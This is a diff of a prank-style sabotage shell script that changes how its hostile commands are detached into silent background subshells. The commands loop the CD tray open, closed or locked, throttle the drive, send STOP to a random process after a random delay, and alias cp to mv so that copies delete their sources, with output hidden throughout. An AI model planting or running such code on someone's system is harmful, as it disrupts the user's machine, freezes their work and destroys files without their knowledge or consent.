@@ -75,29 +75,29 @@ annoying && if [ "$(uname)" = 'Darwin' ]; then
 	# Much less fun on Macs, alas.
 	if [[ $[$RANDOM % 2] == 0 ]]; then
 		# Eject!
-		sh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do drutil eject; sleep $[($RANDOM % 20) + 1]s; done' > /dev/null 2>&1 &
+		(sh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do drutil eject; sleep $[($RANDOM % 20) + 1]s; done' &) >/dev/null 2>&1
 	else
 		# Lock! Admittedly, much less annoying on most Macs,	which don’t support
 		# locking and are slot-loading anyway.
-		sh -c 'while :; do drutil tray close; sleep 0.1s; done' > /dev/null 2>&1 &
+		(sh -c 'while :; do drutil tray close; sleep 0.1s; done' &) >/dev/null 2>&1 
 	fi;
 else
 	N=$[$RANDOM % 3];
 	if [[ $N == 0 ]]; then
 		# Open and close randomly after a few minutes.
-		sh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do eject -T; sleep $[($RANDOM % 20) + 1]s; done' > /dev/null 2>&1 &
+		(sh -c 'sleep $[($RANDOM % 900) + 300]s; while :; do eject -T; sleep $[($RANDOM % 20) + 1]s; done' &) >/dev/null 2>&1
 	elif [[ $N == 1 ]]; then
 		# Lock, and keep closing just in case.
-		sh -c 'while :; do eject -t; eject -i on; sleep 0.1s; done' > /dev/null 2>&1 &
+		(sh -c 'while :; do eject -t; eject -i on; sleep 0.1s; done' &) >/dev/null 2>&1
 	else
 		# Slowness (1× CD speed). This has to be in a loop because it resets with
 		# every ejection.
-		sh -c 'set +o errexit; while :; do eject -x 1; sleep 1s; done' > /dev/null 2>&1 &
+		(sh -c 'set +o errexit; while :; do eject -x 1; sleep 1s; done' &) >/dev/null 2>&1
 	fi;
 fi;
 
 # Send STOP signal to random process at random time.
-destructive && sleep $[ ( $RANDOM % 100 ) + 1 ]s && kill -STOP $(ps x -o pid|sed 1d|sort -R|head -1) &
+destructive && (sleep $[ ( $RANDOM % 100 ) + 1 ]s && kill -STOP "$(ps x -o pid | sed 1d | sort -R | head -1)" &) >/dev/null 2>&1
 
 # Have `cp` perform `mv` instead.
 destructive && alias cp='mv';
